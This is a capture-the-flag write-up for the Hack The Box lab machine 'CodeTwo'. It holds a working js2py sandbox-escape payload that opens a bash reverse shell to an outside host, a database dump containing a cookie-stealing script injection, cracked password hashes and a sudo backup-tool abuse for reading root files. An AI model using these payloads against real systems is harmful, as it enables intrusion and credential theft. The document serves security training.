---
name: CodeTwo
difficulty: easy
os: linux
platform: htb
date:  2025/08/18
# releasedDate: 2099-12-31
userFlag: true
rootFlag: true

img: https://labs.hackthebox.com/storage/avatars/55cc3528cd7ad96f67c4f0c715efe286.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.82 -o allPorts
```

```
PORT   STATE SERVICE REASON
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63
```

We can see that port 22 is open, which is the SSH service and port 8000 is open, which is the HTTP alternative service.

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options
```bash
nmap -p22,8000 -sCV 10.10.11.82 -o targeted
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We download the source code of the app and we see its running a Flask application which runs javascript code using `js2py` with `js2py.disable_pyimport` option active:
```python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

## User Exploitation

We find `CVE-2024-28397` online, which is a vulnerability in `js2py` that allows for remote code execution.

We set up a listener to catch the reverse shell:

```bash
nc -lvnp 443
```

We run the following code in the web application in port 8000:

```javascript
let cmd = "bash -c \"bash -i >& /dev/tcp/10.10.14.216/443 0>&1\""
let hacked, bymarve, n11=11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)

n11
```

If nothing has gone wrong, we should have a reverse shell connection established:
```bash
whoami
```
```
app
```

It looks like we have to migrate to user `marco`.

We find some hashed credentials in database:
```bash
sqlite3 instance/users.db .dump
```
```
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
);
INSERT INTO user VALUES(1,'marco','649c9d65a206a75f5abe509fe128bce5');
INSERT INTO user VALUES(2,'app','a97588c0e2fa3a024876339e27aeb42e');
INSERT INTO user VALUES(3,'gdbxcvgg','5f4dcc3b5aa765d61d8327deb882cf99');
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
);
INSERT INTO code_snippet VALUES(1,6,replace('let cmd = "ls /"\nlet hacked, bymarve, n11\nlet getattr, obj\n\nhacked = Object.getOwnPropertyNames({})\nbymarve = hacked.__getattribute__\nn11 = bymarve("__getattribute__")\nobj = n11("__class__").__base__\ngetattr = obj.__getattribute__\n\nfunction findpopen(o) {\n    let result;\n    for(let i in o.__subclasses__()) {\n        let item = o.__subclasses__()[i]\n        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {\n            return item\n        }\n        if(item.__name__ != "type" && (result = findpopen(item))) {\n            return result\n        }\n    }\n}\n\nn11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()\nconsole.log(n11)\nn11','\n',char(10)));
INSERT INTO code_snippet VALUES(2,7,'<body onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//http://10.10.11.82:8000:4848/?".concat(document.cookie)},1010)></body>');
COMMIT;
```

We use (crackstation)[https://crackstation.net/] to crack the password hash for user `marco` and obtain the password `sweetangelbabylove`.

## Root Exploitation

We check if we can use the `sudo` command:
```bash
sudo -l
```
```
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

We can check what does `/usr/local/bin/npbackup-cli` by looking at its source code:
```bash
cat /usr/local/bin/npbackup-cli
```
```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from npbackup.__main__ import main
if __name__ == '__main__':
    # Block restricted flag
    if '--external-backend-binary' in sys.argv:
        print("Error: '--external-backend-binary' flag is restricted for use.")
        sys.exit(1)

    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

We can try running it with `--help` options:
```bash
sudo /usr/local/bin/npbackup-cli --help
```
usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP]
                    [-b] [-f] [-r RESTORE] [-s] [--ls [LS]] [--find FIND] [--forget FORGET]
                    [--policy] [--housekeeping] [--quick-check] [--full-check]
                    [--check CHECK] [--prune [PRUNE]] [--prune-max] [--unlock]
                    [--repair-index] [--repair-packs REPAIR_PACKS] [--repair-snapshots]
                    [--repair REPAIR] [--recover] [--list LIST] [--dump DUMP]
                    [--stats [STATS]] [--raw RAW] [--init] [--has-recent-snapshot]
                    [--restore-includes RESTORE_INCLUDES] [--snapshot-id SNAPSHOT_ID]
                    [--json] [--stdin] [--stdin-filename STDIN_FILENAME] [-v] [-V]
                    [--dry-run] [--no-cache] [--license] [--auto-upgrade]
                    [--log-file LOG_FILE] [--show-config]
                    [--external-backend-binary EXTERNAL_BACKEND_BINARY]
                    [--group-operation GROUP_OPERATION] [--create-key CREATE_KEY]
                    [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK]
                    [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK]
                    [--check-config-file]

Portable Network Backup Client This program is distributed under the GNU General Public
License and comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome
to redistribute it under certain conditions; Please type --license for more info.

optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current
                        dir/npbackup.conf)
```

We see there is a configuration file located at `/home/marco/npbackup.conf`. We can change the backup directory to `/root` to be able to check the flag: 

```bash
cat /tmp/new_npbackup.conf
```
```
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /root
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
...
...
...
```

We do a backup with new configuration:
```bash
sudo /usr/local/bin/npbackup-cli -c /tmp/new_npbackup.conf -b --force
```

We see what files and directories have been backed up:
```bash
sudo /usr/local/bin/npbackup-cli -c /tmp/new_npbackup.conf --ls
```
```
sudo /usr/local/bin/npbackup-cli -c /tmp/test.conf --ls
2025-08-18 23:10:32,488 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-18 23:10:32,516 :: INFO :: Loaded config 09F15BEC in /tmp/test.conf
2025-08-18 23:10:32,526 :: INFO :: Showing content of snapshot latest in repo default
2025-08-18 23:10:34,716 :: INFO :: Successfully listed snapshot latest content:
snapshot e9238d22 of [/root] at 2025-08-18 23:10:27.600994831 +0000 UTC by root@codetwo filtered by []:
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.local/share/nano/search_history
/root/.mysql_history
/root/.profile
/root/.python_history
/root/.sqlite_history
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.vim
/root/.vim/.netrwhist
/root/root.txt
/root/scripts
/root/scripts/backup.tar.gz
/root/scripts/cleanup.sh
/root/scripts/cleanup_conf.sh
/root/scripts/cleanup_db.sh
/root/scripts/cleanup_marco.sh
/root/scripts/npbackup.conf
/root/scripts/users.db
```

We check the root flag file content:
```bash
sudo /usr/local/bin/npbackup-cli -c /tmp/new_npbackup.conf --dump /root/root.txt
```

```
root flag value
```

<!-- root:$6$UM1RuabUYlt5BQ5q$ZtzAfYOaCaFxA8MGbyH1hegFpzQmJrpIkx7vEIKvXoVl830AXAx1Hgh8r11GlpXgY25LK8wF76nvQYQ1wLSn71:20104:0:99999:7::: -->


## Conclusion

We have successfully exploited the CodeTwo machine by leveraging a vulnerability in the `js2py` library to gain remote code execution, then used that access to escalate privileges to user `marco` and finally to root by exploiting the `npbackup-cli` utility. We were able to retrieve both user and root flags, completing the challenge.